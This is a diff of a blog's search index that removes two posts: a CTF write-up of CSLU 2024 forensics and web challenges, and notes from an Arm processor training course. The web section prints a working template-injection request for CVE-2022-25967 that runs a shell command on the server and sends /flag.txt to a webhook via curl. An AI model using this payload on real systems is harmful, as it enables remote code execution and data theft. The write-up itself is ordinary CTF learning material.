@@ -1,685 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CSLU 2024 UPM</title>
-    <url>/2024/12/31/CSLU-2024-UPM/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Dr-Mals"><a href="#Dr-Mals" class="headerlink" title="Dr. Mals"></a>Dr. Mals</h2><hr>
-<ol>
-<li>Download the Dr. Mals word file</li>
-<li>Use Oletools - olevba to decrypt this file<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/f6c2bc3c-cc2f-40dc-a40b-8eaef09150cd"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li>With the use of CyberChef, we can find out the encoded text<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/927f7112-1acd-487a-8c57-a5a9fa5fa144"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li>Searching the website and it given<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/3f0cf691-eea1-45ce-9dd9-30e9442d1a79"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li>Lets decode this<ul>
-<li>With the use of online decoderwe can find out the flag</li>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/62c1dd32-c3a9-4a8d-9f3b-3b331119dba8"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li>Thats it.</li>
-</ol>
-<h4 id="Acknowledgement"><a href="#Acknowledgement" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h4><p>Thx to Akram for providing Hint</p>
-<h2 id="RE-Memory-Delete"><a href="#RE-Memory-Delete" class="headerlink" title="RE:Memory Delete"></a>RE:Memory Delete</h2><hr>
-<ol>
-<li>First, we download the attached file given by the challenge.<ul>
-<li>Challenge.7z</li>
-</ul>
-</li>
-<li>Unzip it.<br>-Challenge.ad1 files inside.</li>
-<li>.ad1 is a image files so lets use FTK Imager to find the deleted file</li>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/98a6ce23-53b1-4a37-9a8c-9a9cae49e6f1"
-                      alt="image"
-                ></li>
-<li>There goes the flag</li>
-</ol>
-<h2 id="Skyfall"><a href="#Skyfall" class="headerlink" title="Skyfall"></a>Skyfall</h2><hr>
-<p><em>Pain killer, My Skill issue… XD</em></p>
-<ol>
-<li>Download the file attach by the challenge.<br>-capture.pcapng</li>
-<li>Use wireshark to open the pcapng files</li>
-<li>See the clue given, Love the EDITED LEWIS VERSION files and lost the flag.<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/9ec25fe0-ecd3-4587-a4e7-5887377fbfbe"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li>File -&gt; Export -&gt; Http, and save all the files.</li>
-<li>we can see there is 5 files exported, 2 text file with word <code>File received successfully!</code> and <code>file_data=16ae9187d13259788a97aef16a7d50f8b6376fbcba92a0f53e7e68d9f562a3a6576a3183a8dc8631c64fbd9147c8b608</code><ul>
-<li>usefull for later</li>
-</ul>
-</li>
-<li>And there is a file with big data 24,345kb and let us see what file is that.</li>
-</ol>
-<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/395b8f53-8888-4af0-bf28-ae6f5b156992"
-                      alt="image"
-                ></li>
-</ul>
-<ol start="7">
-<li>Looks like it is a elf file<br>  <img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/a9223eb5-5494-4476-b76e-94ca61886bab"
-                      alt="image"
-                ></li>
-<li>I manage to find a website to extract the elf file <a class="link"   href="https://www.ezyzip.com/open-extract-elf-file.html#" >EzyZIP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-<li>We can see the largest file is here after extract</li>
-</ol>
-<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/d61f4dc0-bd2e-4e85-922c-cbaaa903fb5e"
-                      alt="image"
-                ><br>After have a long time searching, i cant found any ways to extract pydata… skill issue XD</li>
-</ul>
-<ol start="10">
-<li>After the end of the day, my friend told me there is something call <code>Pyinstxtractor</code> that can extract it.<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/647ba1e4-5257-4eae-8e27-94885a3b018b"
-                      alt="image"
-                ></li>
-<li>This is what i found</li>
-</ul>
-</li>
-<li>okayyyy here is it<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/839516f6-2d26-4c28-af8e-cfbd172314e6"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li>Theres alot files inside, but the one the name <code>skyfall-lewis-edited-version.pyc</code> is the most suspicious.<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/b3e6721f-12fd-4eba-a1fc-7d8d92ac3bc0"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li>With the use of this website <a class="link"   href="https://pylingual.io/" >Pylingual<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, i transfer pyc files to py<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/575f7882-fe26-4d1c-91f5-69de17c6099c"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li>We can see it is a AES encyption function and the key is the time which the user encrypt when downloaded, so lets go back to wireshark and find the date when she successfuly download.<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/f286e913-9441-4f6b-8273-1b7df152b17d"
-                      alt="image"
-                ></li>
-<li>We can find out that the epoch for the time she download the file is <code>1733988750</code></li>
-</ul>
-</li>
-<li>Then use GPT xd find the key out<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/c5d87093-080a-410e-b361-ce07d7c64747"
-                      alt="image"
-                ></li>
-<li>ps: I also dk why need to use <code>1733988749</code> just told by my friend to use it cant find any things that support this epoch XD.</li>
-</ul>
-</li>
-<li>Okay, then let us go to decrypt it. Use cyberchef</li>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/0a6837ae-ddf5-41d3-a810-7318c56a4607"
-                      alt="image"
-                ><br>Heres the flag.<br>Okay its maybe abit harder than i though. cry die.</li>
-</ol>
-<h4 id="Acknowledgement-1"><a href="#Acknowledgement-1" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h4><p>Thx to Bakayang for providing solution at the end of the day</p>
-<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Useless-Website"><a href="#Useless-Website" class="headerlink" title="Useless Website"></a>Useless Website</h2><hr>
-<ol>
-<li><p>Download the source code of the website</p>
-</li>
-<li><p>We can see theres something in the package.json file</p>
-<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/ded38f60-d45c-406f-87ca-353241b395e5"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li><p>Searching on the internet <code>CVE-2022-25967</code> showing that there is some leakage can be use on the eta framework.</p>
-</li>
-<li><p>In burpsuite, intercept the web and change to this</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>/utils/settings HTTP/1.1</span></figcaption><table><tr><td class="code"><pre><span class="line">Host: 5.75.155.50:1341</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-None-Match: W/&quot;1057-ih1IUXlwncna8aHynJLYIHjiX30&quot;</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Length: 292</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;settings&quot;: &#123;</span><br><span class="line">    &quot;view options&quot;: &#123;</span><br><span class="line">      &quot;varName&quot;: &quot;x=process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;curl https://webhook.site/self id/$(cat /flag.txt)&#x27;)&quot;,</span><br><span class="line">      &quot;include&quot;: false,</span><br><span class="line">      &quot;includeFile&quot;: false,</span><br><span class="line">      &quot;useWith&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p>And we can find out the flag at the end of the webhook link.</p>
-<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/ee3ce174-09de-43c1-82ea-43f979aa075d"
-                      alt="image"
-                ></li>
-<li><code>CSLU&#123;wh4ts_y0ur_et4?&#125;</code></li>
-</ul>
-</li>
-</ol>
-<h4 id="Acknowledgement-2"><a href="#Acknowledgement-2" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h4><p>Thx for Megat for the solution.</p>
-]]></content>
-      <categories>
-        <category>CTF 2024</category>
-      </categories>
-      <tags>
-        <tag>Forensics</tag>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Arm-Malaysia On Demand Training</title>
-    <url>/2025/07/28/Arm-Malaysia-On-Demand-Traning/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="Arm-Malaysia-On-Demand-Training"><a href="#Arm-Malaysia-On-Demand-Training" class="headerlink" title="Arm-Malaysia On Demand Training"></a>Arm-Malaysia On Demand Training</h1><h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><h3 id="Introduction-to-ARM"><a href="#Introduction-to-ARM" class="headerlink" title="Introduction to ARM"></a>Introduction to ARM</h3><p>ARM stands for Advanced RISC Machine, a family of computer processors that are widely used in mobile devices, embedded systems, and increasingly in servers and desktops. ARM processors are known for their power efficiency and performance. Almost 100% of smartphones and tablets use ARM processors, making them a dominant force in the mobile computing market.</p>
-<p>Arm’s Company is a British semiconductor and software design company, known for its ARM architecture. The company designs the ARM architecture and licenses it to other companies like Apple, Samsung, MediaTek and many more.</p>
-<h3 id="Introduction-to-ARM-CPU-Architecture"><a href="#Introduction-to-ARM-CPU-Architecture" class="headerlink" title="Introduction to ARM CPU Architecture"></a>Introduction to ARM CPU Architecture</h3><p>The ARM CPU architecture defines a CPU’s behavior when software runs on it.</p>
-<ul>
-<li>CPU architecture defines the basic instruction set and the exception and memory models that are relied on by the operating system and hypervisor</li>
-<li>CPU microarchitecture defines the implementation of the CPU architecture, including the pipeline, cache, and other hardware features.</li>
-</ul>
-<p><strong>A-profile (Application profile)</strong> is used in high-performance applications such as smartphones, tablets, and laptops. It includes features like:</p>
-<ul>
-<li>Support for virtual memory</li>
-<li>Support for multiple cores</li>
-<li>Support for SIMD (Single Instruction, Multiple Data) instructions</li>
-</ul>
-<p>Mostly targets running a full OS such as Linux</p>
-<ul>
-<li><strong>Implementation</strong>: Cortex-A, Cortex-X and Neoverse</li>
-<li><strong>Latest Version</strong>: Armv9-A and Armv8-A</li>
-</ul>
-<p><strong>R-Profile (Real-time profile)</strong> is used in real-time applications such as automotive and industrial control systems. It includes features like:</p>
-<ul>
-<li>Low-latency interrupt handling</li>
-<li>Deterministic execution</li>
-</ul>
-<p>Targets embedded systems with real-time requirements</p>
-<ul>
-<li><strong>Implementation</strong>: Cortex-R</li>
-<li><strong>Latest Version</strong>: Armv8-R</li>
-</ul>
-<p><strong>M-profile (Microcontroller profile)</strong> is used in microcontrollers and embedded systems. It includes features like:</p>
-<ul>
-<li><p>Low power consumption</p>
-</li>
-<li><p>Small code size</p>
-</li>
-<li><p><strong>Implementation</strong>: Cortex-M</p>
-</li>
-<li><p><strong>Latest Version</strong>: Armv8-M</p>
-</li>
-</ul>
-<h4 id="Execution-States"><a href="#Execution-States" class="headerlink" title="Execution States"></a>Execution States</h4><p><strong>AArch32</strong>: AArch32 is the 32-bit execution state of the ARM architecture. It supports both ARM and Thumb instruction sets and is used in a wide range of applications, from embedded systems to mobile devices. Supports T32 and A32 instruction sets.</p>
-<p><strong>AArch64</strong>: AArch64 is the 64-bit execution state of the ARM architecture. It supports a new instruction set and is designed for high-performance applications, such as servers and desktops. It is also used in mobile devices that require more memory and processing power. Supports A64 instruction set.</p>
-<p><strong>Big.LITTLE</strong>: Big.LITTLE is a heterogeneous computing architecture that combines high-performance cores (big) with power-efficient cores (LITTLE) in a single system-on-chip (SoC). This allows the system to dynamically switch between cores based on workload requirements, optimizing performance and power consumption.</p>
-<h4 id="R-Profile-Architecture"><a href="#R-Profile-Architecture" class="headerlink" title="R-Profile Architecture"></a>R-Profile Architecture</h4><ul>
-<li>No overlapping memory regions</li>
-<li>New exception model compatible with the Armv8-A model</li>
-<li>Virtualization support</li>
-<li>Memory management unit (MMU) support</li>
-</ul>
-<p><strong>Cortex-R Processors</strong>: Cortex-R82 with memory management unit (MMU) support for OS like Linux</p>
-<h4 id="M-Profile-Architecture"><a href="#M-Profile-Architecture" class="headerlink" title="M-Profile Architecture"></a>M-Profile Architecture</h4><p>Low-latency, highly deterministic operation</p>
-<ul>
-<li><strong>Armv8-M Baseline</strong>: Introduced the Armv8-M architecture, which includes support for the Armv8-M Security Extension (TrustZone) and the Armv8-M Mainline profile.</li>
-<li><strong>Armv8-M Mainline</strong>: Introduced the Armv8-M Mainline profile, which includes support for the Armv8-M Security Extension (TrustZone) and the Armv8-M Baseline profile.</li>
-</ul>
-<h4 id="AMBA"><a href="#AMBA" class="headerlink" title="AMBA"></a>AMBA</h4><p>The Advanced Microcontroller Bus Architecture (AMBA) is an open standard on-chip interconnect specification for the connection and management of functional blocks in SoC designs.</p>
-<p>AMBA is used to connect different components of a system-on-chip (SoC) design, such as processors, memory, and peripherals. It provides a standard interface for communication between these components, allowing for easier integration and interoperability.</p>
-<p><strong>Why use AMBA?</strong></p>
-<ul>
-<li><strong>Efficient IP reuse</strong>: IP reuse is an essential part of SoC design, and AMBA provides a standard interface for communication between different components, allowing for easier integration and interoperability.</li>
-<li><strong>Flexibility</strong>: AMBA provides a flexible and scalable architecture that can be used to connect different components of a system-on-chip (SoC) design, allowing for easier integration and interoperability.</li>
-<li><strong>Compatibility</strong>: AMBA is a widely used standard in the industry, and many IP cores are designed to be compatible with it, making it easier to integrate different components into a system-on-chip (SoC) design.</li>
-</ul>
-<h3 id="Security-in-Cortex-A"><a href="#Security-in-Cortex-A" class="headerlink" title="Security in Cortex-A"></a>Security in Cortex-A</h3><p>Cortex-A processors are designed with security features to protect against various threats, including malware and unauthorized access. These features include:</p>
-<ul>
-<li><strong>TrustZone</strong>: A hardware-based security extension that creates a secure execution environment for sensitive applications, allowing them to run in isolation from the rest of the system.</li>
-<li><strong>Memory Protection Unit (MPU)</strong>: A hardware component that enforces memory access permissions, preventing unauthorized access to sensitive data.</li>
-<li><strong>Secure Boot</strong>: A process that ensures only trusted software is loaded during the boot process, preventing malicious code from executing.</li>
-<li><strong>Cryptographic Acceleration</strong>: Hardware support for cryptographic operations, such as encryption and decryption, to enhance security and performance.</li>
-</ul>
-<h4 id="Armv9-A-Architecture-for-a-Rich-Secure-IoT-Ecosystem"><a href="#Armv9-A-Architecture-for-a-Rich-Secure-IoT-Ecosystem" class="headerlink" title="Armv9-A Architecture for a Rich Secure IoT Ecosystem"></a>Armv9-A Architecture for a Rich Secure IoT Ecosystem</h4><ul>
-<li><strong>Memory tagging</strong>: Support for memory tagging to enhance security and prevent memory-related attacks.</li>
-<li><strong>Secure-EL2</strong>: A secure exception level that provides an isolated environment for sensitive operations.</li>
-<li><strong>uArch side-band protection</strong>: Hardware-based protection mechanisms to secure microarchitecture elements.</li>
-<li><strong>Crypto support</strong>: Enhanced hardware support for cryptographic operations.</li>
-<li><strong>Branch target identifiers</strong>: Mechanisms to protect against branch target injection attacks.</li>
-<li><strong>Pointer authentication</strong>: Techniques to verify the authenticity of pointers and prevent unauthorized access.</li>
-</ul>
-<h4 id="Cortex-ISA-Progression-for-ML"><a href="#Cortex-ISA-Progression-for-ML" class="headerlink" title="Cortex ISA Progression for ML"></a>Cortex ISA Progression for ML</h4><ul>
-<li><strong>Armv7-A NEON</strong> including: 32x64bit register (Cortex-A7)</li>
-<li><strong>Armv8.0-A NEON</strong> including AArch32 and AArch64 (Cortex-A53)</li>
-<li><strong>Armv8.2-A NEON</strong> including: FP16 support (Cortex-A55)</li>
-<li><strong>Armv9.2-A SVE2</strong> including BF16 support (Cortex-A520)</li>
-</ul>
-<h4 id="SVE2-SIMD-Architecture-for-Next-Decade-of-Devices"><a href="#SVE2-SIMD-Architecture-for-Next-Decade-of-Devices" class="headerlink" title="SVE2: SIMD Architecture for Next Decade of Devices"></a>SVE2: SIMD Architecture for Next Decade of Devices</h4><ul>
-<li><strong>Better Developer experience</strong>: SVE2 provides a more flexible and efficient programming model for developers, allowing them to write code that can take advantage of the latest hardware features.</li>
-<li><strong>Better Auto-Vectorization</strong>: SVE2 provides better support for auto-vectorization, allowing compilers to generate more efficient code for SIMD operations.</li>
-</ul>
-<h4 id="Scalable-Matrix-Extension-SME"><a href="#Scalable-Matrix-Extension-SME" class="headerlink" title="Scalable Matrix Extension (SME)"></a>Scalable Matrix Extension (SME)</h4><p>SME2 execution unit in CPU cluster</p>
-<ul>
-<li>Matrix outer product</li>
-<li>Shared between all the CPUs</li>
-<li>All CPUs have access to the engine</li>
-<li>Transparent to OS</li>
-</ul>
-<p><em>(Resource from ARM Scalable Matrix Extension SME introduction)</em></p>
-<h4 id="Benefits-of-SME2-in-CPU"><a href="#Benefits-of-SME2-in-CPU" class="headerlink" title="Benefits of SME2 in CPU"></a>Benefits of SME2 in CPU</h4><ul>
-<li><strong>Performance</strong>: SME2 provides a significant performance boost for matrix operations, which are commonly used in machine learning and AI applications.</li>
-<li><strong>Flexibility &amp; Future-Proof</strong>: SME2 is designed to be flexible and future-proof, allowing it to adapt to new workloads and use cases as they emerge.</li>
-<li><strong>Developer Efficiency</strong>: SME2 provides tools and features that enhance developer productivity, making it easier to write and optimize code for matrix operations.</li>
-<li><strong>Security</strong>: SME2 includes security features to protect against potential threats and vulnerabilities, ensuring the integrity and confidentiality of data processed by the engine.</li>
-</ul>
-<h4 id="Software-Stack"><a href="#Software-Stack" class="headerlink" title="Software Stack"></a>Software Stack</h4><p>Cortex-A software stack for Hayas composed of:</p>
-<ul>
-<li><strong>ML</strong>: TFL runtime ONNX, TVM, ArmNN, ACL</li>
-<li><strong>Computer Vision</strong>: OpenCV, ACL</li>
-<li><strong>Security</strong>: TF-A, OP-TEE, Secure Partition Manager</li>
-</ul>
-<h4 id="Arm-Kleidi-Libraries"><a href="#Arm-Kleidi-Libraries" class="headerlink" title="Arm Kleidi Libraries"></a>Arm Kleidi Libraries</h4><ul>
-<li>Arm Kleidi AI</li>
-<li>Arm Kleidi CV</li>
-</ul>
-<p><em>&#x2F;&#x2F;write more about Arm Kleidi AI and CV</em></p>
-<h3 id="Cortex-R-Benefits"><a href="#Cortex-R-Benefits" class="headerlink" title="Cortex-R Benefits"></a>Cortex-R Benefits</h3><p>Cortex-R processors are designed for real-time applications, providing low-latency and deterministic performance. They are used in applications such as automotive, industrial control systems, and medical devices.</p>
-<h4 id="Key-Benefits"><a href="#Key-Benefits" class="headerlink" title="Key Benefits"></a>Key Benefits</h4><ul>
-<li><strong>Fast and deterministic response times</strong>: Cortex-R processors are designed to provide fast and deterministic response times, making them ideal for real-time applications.</li>
-<li><strong>Real-time performance</strong>: Tightly coupled memory, low latency peripheral ports, and a low-latency interrupt controller.</li>
-<li><strong>High reliability and fault tolerance</strong>: Cortex-R processors are designed to be highly reliable and fault-tolerant, making them ideal for applications that require high reliability and fault tolerance.</li>
-</ul>
-<h4 id="Applications-of-Cortex-R-Processors"><a href="#Applications-of-Cortex-R-Processors" class="headerlink" title="Applications of Cortex-R Processors"></a>Applications of Cortex-R Processors</h4><ul>
-<li><strong>Automotive</strong>: Cortex-R processors are used in automotive applications such as advanced driver assistance systems (ADAS), electronic stability control (ESC), and anti-lock braking systems (ABS).</li>
-<li><strong>Industrial control systems</strong>: Cortex-R processors are used in industrial control systems such as robotics, factory automation, and process control.</li>
-<li><strong>Medical devices</strong>: Cortex-R processors are used in medical devices such as patient monitoring systems, infusion pumps, and imaging systems.</li>
-<li><strong>Other applications</strong>: Automotive, modem, storage, healthcare, industrial control systems, and more.</li>
-</ul>
-<p>The latest <strong>Cortex-R82AE</strong> features 64-bit architecture with enhanced functional safety capabilities, virtual memory management, full system coherency, and native 64-bit instruction execution support.</p>
-<p><strong>Note</strong>: Cortex-A MMU is required for HLOS e.g. Linux&#x2F;Android while Cortex-R typically runs on RTOS like FreeRTOS, Zephyr, and others.</p>
-<h4 id="Functional-Safety"><a href="#Functional-Safety" class="headerlink" title="Functional Safety"></a>Functional Safety</h4><ul>
-<li>Systematic Errors Protection</li>
-<li>Integrated Safety Mechanisms</li>
-<li>Fault Detection and Recovery</li>
-</ul>
-<h3 id="Cortex-M"><a href="#Cortex-M" class="headerlink" title="Cortex-M"></a>Cortex-M</h3><p>Cortex-M is the most units shipped in the world, with over 200 billion units shipped since its introduction in 2004. It is used in a wide range of applications, including consumer electronics, automotive, industrial control systems, and medical devices.</p>
-<p>Cortex-M processors are designed for low-power, low-cost applications, providing a balance between performance and power efficiency. They are used in applications such as IoT devices, wearables, and smart home devices.</p>
-<h4 id="Applications-of-Cortex-M-Processors"><a href="#Applications-of-Cortex-M-Processors" class="headerlink" title="Applications of Cortex-M Processors"></a>Applications of Cortex-M Processors</h4><ul>
-<li>Energy grid, automotive, consumer electronics, industrial control systems, healthcare, retail, smart city, VR&#x2F;AR, connected clothing and more.</li>
-</ul>
-<h4 id="Factors-to-Choose-Suitable-Cortex-M"><a href="#Factors-to-Choose-Suitable-Cortex-M" class="headerlink" title="Factors to Choose Suitable Cortex-M"></a>Factors to Choose Suitable Cortex-M</h4><p>When selecting the appropriate Cortex-M processor for your application, consider these key factors:</p>
-<ul>
-<li><strong>Cost&#x2F;Die Area</strong>: Smaller die size reduces manufacturing costs, making it ideal for high-volume consumer products</li>
-<li><strong>Low Power</strong>: Ultra-low power consumption extends battery life for IoT devices and wearables</li>
-<li><strong>DSP Capabilities</strong>: Built-in digital signal processing features for audio, sensor data, and control algorithms</li>
-<li><strong>Security</strong>: Hardware security features like TrustZone-M for secure boot and data protection</li>
-<li><strong>Performance</strong>: Processing speed and efficiency for real-time applications and responsiveness</li>
-<li><strong>ML Support</strong>: Machine learning acceleration for edge AI applications and intelligent sensing</li>
-</ul>
-<h4 id="Arm-Helium"><a href="#Arm-Helium" class="headerlink" title="Arm Helium"></a>Arm Helium</h4><p><a class="link"   href="https://arm.com/resource/ebook/helium-mve-reference-book" >arm.com&#x2F;resource&#x2F;ebook&#x2F;helium-mve-reference-book<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<ul>
-<li>In DSP&#x2F;ML performance</li>
-<li>x2 datapath increase</li>
-<li>Achieve a x4 uplift in DSP&#x2F;ML performance</li>
-</ul>
-<h4 id="Open-Source-Libraries-Supporting-Helium"><a href="#Open-Source-Libraries-Supporting-Helium" class="headerlink" title="Open Source Libraries Supporting Helium"></a>Open Source Libraries Supporting Helium</h4><ul>
-<li><strong>CMSIS-DSP</strong>: CMSIS-DSP is a library of DSP functions optimized for Cortex-M processors, providing efficient implementations of common DSP algorithms.</li>
-<li><strong>CMSIS-Stream and CMSIS-NN</strong>: CMSIS-Stream and CMSIS-NN are libraries for machine learning and neural network applications on Cortex-M processors, providing optimized implementations of common ML algorithms.</li>
-<li><strong>Arm-2D Graphics Library</strong>: The Arm-2D graphics library is a lightweight, high-performance graphics library for Cortex-M processors, providing efficient rendering of 2D graphics.</li>
-</ul>
-<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul>
-<li>Cortex-M spans the spectrum of embedded applications</li>
-<li>Drives up energy efficiency</li>
-<li>High performance</li>
-</ul>
-<h1 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h1><h2 id="SoC-Development-Flow"><a href="#SoC-Development-Flow" class="headerlink" title="SoC Development Flow"></a>SoC Development Flow</h2><p>Key Stages</p>
-<ul>
-<li>1 Architecture Definition &amp; Specification<ul>
-<li>Define the system requirements based on target applications (e.g., mobile, IoT, edge AI)</li>
-</ul>
-</li>
-<li>2 IP Selection and Integration<ul>
-<li>Select pre-verified RTL IP from providers like Arm (e.g., CPU, system interconnects, Corstone Subsystem)</li>
-<li>Integrate third-party IPs (e.g., security engines, wireless transceivers)</li>
-</ul>
-</li>
-<li>3 Frontend Design and Verification<ul>
-<li>Perform RTL design using Verilog&#x2F;SystemVerilog and desin sysnthesis for digital logic</li>
-</ul>
-</li>
-<li>4 Software Development( in Parallel)<ul>
-<li>Use virtua platforms (e.g. ARM FVPs) to enable early software development before hardware is ready.</li>
-<li>Develop and validate firmware, bloatloaders, devides drivers, and applications software.</li>
-</ul>
-</li>
-<li>5 Backend Implementation<ul>
-<li>Complete logi synthesis to convert RTL into gate-level netlist</li>
-<li>Perform place and route to create physical layout</li>
-<li>Run DFM (design for Manufactueabilty) checks</li>
-</ul>
-</li>
-<li>6 Tape-out and Fabrication<ul>
-<li>Generate the final GDSII (GDSII) file layout file and deliver it to the semiconductor foundary</li>
-</ul>
-</li>
-<li>7 Validation and bring up<ul>
-<li>Use evaluation board or FPGA prototypes for post-silicon validation</li>
-</ul>
-</li>
-<li>8 Mass Production and Deployment<ul>
-<li>Manufacture the SoC at scale and deploy it in target devices</li>
-</ul>
-</li>
-</ul>
-<h2 id="Key-Components-of-Arm-Based-SoC"><a href="#Key-Components-of-Arm-Based-SoC" class="headerlink" title="Key Components of Arm-Based SoC"></a>Key Components of Arm-Based SoC</h2><h3 id="1-ARM-Cpu-Cores"><a href="#1-ARM-Cpu-Cores" class="headerlink" title="1 ARM Cpu Cores"></a>1 ARM Cpu Cores</h3><ul>
-<li>** Cortes-A**: High-performance application processors for smartphones, tablets, and laptops.</li>
-<li><strong>Cortex-R</strong>: Real-time processors for automotive, industrial control, and medical devices</li>
-<li><strong>Cortex-M</strong>: Low-power microcontrollers for IoT, wearables, and</li>
-</ul>
-<h3 id="Memory-Subsystem"><a href="#Memory-Subsystem" class="headerlink" title="Memory Subsystem"></a>Memory Subsystem</h3><ul>
-<li><strong>L1&#x2F;L2&#x2F;L3 Cache</strong>: On-chip caches for fast access to frequently used data, TCM (tightly Coupled Memory)</li>
-<li><strong>DDR Memory Controller</strong>: Interface to external DRAM memory (e.g., LPDDR4, DDR5)</li>
-<li>On-chip SDRAM and ROM with support for external DRAM and flash memory</li>
-</ul>
-<h3 id="AMBA-Interconnect-Fabric"><a href="#AMBA-Interconnect-Fabric" class="headerlink" title="AMBA Interconnect Fabric"></a>AMBA Interconnect Fabric</h3><ul>
-<li>Arm -based SoC use AMBA (Advanced Microcontroller Bus Architecture) protovols”:<ul>
-<li>AXI (Advanced eXtensible Interface): High-performance interconnect for connecting high-speed peripherals and memory</li>
-<li>AHB (Advanced High-performance Bus): Used for connecting lower-speed peripherals and memory</li>
-<li>APB (Advanced Peripheral Bus): Low-power bus for connecting low-speed peripherals</li>
-</ul>
-</li>
-</ul>
-<h3 id="ARM-System-IP-and-CCorstone-Subsystem"><a href="#ARM-System-IP-and-CCorstone-Subsystem" class="headerlink" title="ARM System IP and CCorstone Subsystem"></a>ARM System IP and CCorstone Subsystem</h3><p>Include essential Arm System IP<br>    - NIC-400&#x2F;NIC-450 (Interconnect)<br>    - MMU&#x2F;MOU, DMA controllers, timer and power management blocks</p>
-<h3 id="Peripherals-and-I-O-Interfaces"><a href="#Peripherals-and-I-O-Interfaces" class="headerlink" title="Peripherals and I&#x2F;O Interfaces"></a>Peripherals and I&#x2F;O Interfaces</h3><ul>
-<li>Standard communication interfaces: UART, SPI, I2C, CAN , USB, Ethernet</li>
-<li>general purpose I&#x2F;Os (GPIOs), Timers, ADCs.DACs</li>
-<li>Interfaces for display camera or storages as needed (ed. mipi, sido)</li>
-</ul>
-<h3 id="AI-ML-and-Arithmetic-Hardware-Accelerators"><a href="#AI-ML-and-Arithmetic-Hardware-Accelerators" class="headerlink" title="AI&#x2F;ML and Arithmetic Hardware Accelerators"></a>AI&#x2F;ML and Arithmetic Hardware Accelerators</h3><ul>
-<li>Arm Ethos-N NPU for AI&#x2F;ML inference acceleration</li>
-<li>CCompatible with TensorFlow Lite for Microcontrollers, TVM and Vela compiler</li>
-</ul>
